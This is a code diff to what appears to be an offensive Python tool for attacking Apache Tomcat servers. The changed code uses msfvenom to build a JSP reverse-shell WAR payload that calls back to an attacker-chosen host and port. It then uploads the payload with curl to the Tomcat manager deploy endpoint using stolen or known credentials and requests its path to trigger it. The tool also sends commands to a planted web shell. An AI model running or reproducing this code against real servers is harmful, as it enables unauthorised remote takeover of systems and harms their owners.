@@ -1,9 +1,14 @@
 import argparse
+import os.path
+import random
 import signal
 import re
+import string
 import subprocess
 import sys
 import concurrent.futures
+from zipfile import ZipFile
+
 import requests
 from requests.auth import HTTPBasicAuth
 from packaging.version import Version
@@ -224,18 +229,27 @@ class authenticated_attack(tomcat):
                             print(response)
 
             case "reverse":
+
+                filename = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
+
                 response = requests.get(url=f"{self.url}/reverse_shell/index.jsp")
 
                 output.message(state="info", description=f"LPORT: {args.lport}", clear_before=False)
                 output.message(state="info", description=f"LHOST: {args.lhost}", clear_before=False)
 
                 if response.status_code != 200:
-                    subprocess.run(
-                        ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}", "-f", "raw",
-                         "-o", "jerry.jsp"], check=True)
 
-                    command = f'curl --upload-file webshell/reverse_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/reverse_shell"'
+                    if os.path.exists(f"reverse/{filename}.war"):
+                        os.remove(f"reverse/{filename}.war")
+
+                    command = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={args.lhost} LPORT={args.lport} -f raw -o reverse/{filename}.war"
+
                     subprocess.run(command, shell=True, check=True)
+
+                    command = f'curl --upload-file reverse/{filename}.war -u "{self.username}:{self.password}" "{self.url}manager/text/deploy?path=/{filename}"'
+                    subprocess.run(command, shell=True, check=True)
+
+                    requests.get(url=f"{self.url}{filename}/")
 
     def execute_webshell_cmd(self, cmd: str):
         response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
